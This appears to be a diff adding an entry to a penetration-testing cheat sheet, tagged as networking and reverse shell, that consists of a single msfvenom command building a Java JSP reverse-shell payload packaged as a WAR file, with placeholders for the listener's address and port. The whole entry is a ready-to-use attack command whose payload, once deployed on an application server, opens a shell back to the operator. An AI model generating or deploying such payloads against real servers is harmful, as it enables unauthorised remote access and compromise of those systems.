@@ -1,0 +1,7 @@
+---
+syntax: bash
+tags: [networking, revshell]
+---
+# java warfile reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o rs.war
+
